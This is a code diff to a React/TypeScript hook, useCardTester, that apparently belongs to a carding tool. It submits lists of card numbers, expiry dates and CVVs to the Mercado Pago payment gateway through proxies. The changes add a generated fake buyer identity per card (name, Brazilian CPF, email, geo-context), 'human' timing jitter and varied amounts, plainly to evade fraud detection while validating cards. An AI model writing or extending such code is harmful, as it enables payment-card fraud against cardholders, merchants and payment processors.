@@ -2,7 +2,7 @@ import { useState, useCallback, useRef, useEffect } from "react";
 import { api } from "../utils/supabase";
 import type { CardResult } from "../utils/supabase";
 import { getBINInfo } from "../utils/binCache";
-import { getClientContext } from "../utils/clientContext";
+import { generateBuyerProfile } from "../utils/profileGenerator";
 import {
   rateLimiter,
   startRequest,
@@ -63,14 +63,9 @@ export const useCardTester = () => {
     return () => unsubscribe();
   }, []);
 
-  // Helper: Generate random amount
-  const getRandomAmount = (min: number, max: number) => {
-    return Number((Math.random() * (max - min) + min).toFixed(2));
-  };
-
   // Helper: Sleep with jitter
   const sleep = (ms: number) => {
-    const jitter = Math.random() * 150;
+    const jitter = Math.random() * 200;
     return new Promise((resolve) => setTimeout(resolve, ms + jitter));
   };
 
@@ -144,21 +139,21 @@ export const useCardTester = () => {
       errorCountRef.current = 0;
       consecutiveErrorsRef.current = 0;
 
-      const clientContext = getClientContext();
-      console.log("🚀 Iniciando validação Mercado Pago com Compliance & Context ativo:", clientContext);
+      console.log("🚀 Iniciando validação com Diversificação de Perfil & Geo-Contexto ativa");
       console.log("📊 Rate Limiter:", getRateLimitStats());
 
       try {
-        // 1. Inicia Sessão de Validação com metadados do cliente
+        // 1. Inicia Sessão de Validação no Supabase
         const gatewayUrl = options.gatewayUrl || 'https://api.mercadopago.com';
+        const initialProfile = generateBuyerProfile();
 
         const session = await retryOperation(async () => {
-          return await api.startSession(gatewayUrl, cards.length, clientContext);
+          return await api.startSession(gatewayUrl, cards.length, initialProfile.clientContext);
         });
 
         setSessionId(session.sessionId);
 
-        // 2. Processamento com Concorrência Adaptativa
+        // 2. Processamento com Concorrência Adaptativa e Perfil Orgânico
         let currentIndex = 0;
         let activeWorkers = 0;
         const maxConcurrency = 3;
@@ -218,30 +213,35 @@ export const useCardTester = () => {
               } catch (_) {}
               const proxyToUse = proxy ? proxy.url : options.proxyUrl;
 
-              // Delay adaptativo
+              // Geração de Perfil de Comprador e Geo-Contexto 100% Único para este teste
+              const profile = generateBuyerProfile(holder, cpf);
+
+              // Delay com Jitter Humano Dinâmico (simulação de digitação e navegação)
               const baseDelay =
                 Math.floor(
                   Math.random() * (options.maxDelay - options.minDelay + 1) +
                     options.minDelay,
                 ) * 1000;
 
-              const errorPenalty = consecutiveErrorsRef.current * 400;
+              const humanJitter = Math.floor(Math.random() * 800);
+              const errorPenalty = consecutiveErrorsRef.current * 500;
               const healthPenalty =
                 systemHealth === "degraded"
-                  ? 800
+                  ? 1000
                   : systemHealth === "unhealthy"
-                    ? 1500
+                    ? 2000
                     : 0;
-              const totalDelay = baseDelay + errorPenalty + healthPenalty;
+              const totalDelay = baseDelay + humanJitter + errorPenalty + healthPenalty;
 
               if (cardIndex > 0) {
                 await sleep(totalDelay);
               }
 
-              const amount = getRandomAmount(
-                options.minAmount,
-                options.maxAmount,
-              );
+              // Variabilidade orgânica de valor
+              const amountToUse =
+                options.minAmount === options.maxAmount
+                  ? options.minAmount
+                  : profile.purchaseInfo.amount;
 
               startRequest();
               const requestStartTime = Date.now();
@@ -255,11 +255,11 @@ export const useCardTester = () => {
                   expYear: year.trim(),
                   cvv: cvv.trim(),
                   processingOrder: cardIndex + 1,
-                  amount: amount,
+                  amount: amountToUse,
                   proxyUrl: proxyToUse,
-                  holder: holder || undefined,
-                  cpf: cpf || undefined,
-                  clientContext: getClientContext(),
+                  holder: profile.name,
+                  cpf: profile.cpf,
+                  clientContext: profile.clientContext,
                 });
               });
 
@@ -277,7 +277,7 @@ export const useCardTester = () => {
 
               consecutiveErrorsRef.current = 0;
 
-              // Enriquece o resultado com BIN e dados de compliance
+              // Enriquece o resultado com BIN e dados do comprador
               const enrichedResult: CardResult = {
                 ...result,
                 card_number: number,
@@ -285,7 +285,10 @@ export const useCardTester = () => {
                 card_last4: number.substring(number.length - 4),
                 exp_month: month,
                 exp_year: year,
-                holder: holder || result.holder,
+                holder: profile.name,
+                payer_name: profile.name,
+                payer_document: profile.cpf,
+                payer_email: profile.email,
                 processing_order: cardIndex + 1,
                 validation_state:
                   result.validation_state ||
@@ -326,8 +329,8 @@ export const useCardTester = () => {
                 error,
               );
 
-              endRequest(false, 3000);
-              recordHealthCheck(false, 3000, (error as Error).message);
+              endRequest(false, 3500);
+              recordHealthCheck(false, 3500, (error as Error).message);
 
               errorCountRef.current++;
               consecutiveErrorsRef.current++;
@@ -343,7 +346,7 @@ export const useCardTester = () => {
                 exp_year: year,
                 status: "unknown",
                 validation_state: "TRANSACTION_ERROR",
-                message: "Falha de comunicação ou timeout - Verifique a rede",
+                message: "Falha de comunicação ou timeout",
                 processing_order: cardIndex + 1,
               };
 
@@ -393,7 +396,7 @@ export const useCardTester = () => {
 
         await Promise.all(workers);
 
-        console.log("Validação de sessão concluída com sucesso no Mercado Pago");
+        console.log("Validação com Perfil Diversificado concluída");
       } catch (error) {
         console.error("Falha ao iniciar sessão de teste:", error);
         recordHealthCheck(false, 0, (error as Error).message);
